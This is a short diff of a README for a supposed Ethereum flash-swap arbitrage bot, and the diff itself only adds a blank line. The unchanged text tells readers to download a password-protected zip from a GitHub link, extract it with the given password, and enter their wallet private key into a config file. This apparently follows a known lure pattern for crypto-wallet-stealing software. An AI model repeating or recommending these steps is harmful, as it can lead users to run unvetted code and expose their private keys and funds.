@@ -21,5 +21,6 @@ Because flash swaps are atomic Ethereum transactions, this arbitrage bot can exe
 - [Download](https://github.com/Cardo16/flash-swap-arbitrage/archive/refs/heads/main.zip) the repository release and extract files with password `3n02drW1w`.
 - Edit the `address` and `private_key` fields in the config.json file.
 - Set up the network and AMMs in the flashbot menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.
+
 ### Note
 When using a public RPC provider, the user may experience rate limiting or slow connection speeds. This bot is most effective when connected to a private light node.
